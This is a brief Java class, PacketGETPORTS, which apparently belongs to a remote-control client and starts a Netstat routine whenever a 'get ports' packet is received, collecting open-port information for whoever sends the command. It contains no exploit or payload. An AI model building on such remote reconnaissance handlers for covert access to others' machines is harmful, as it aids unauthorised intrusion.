package com.redpois0n.packets;

import com.redpois0n.Netstat;

public class PacketGETPORTS extends Packet {

	@Override
	public void read(String line) throws Exception {
		new Netstat().start();
	}

}
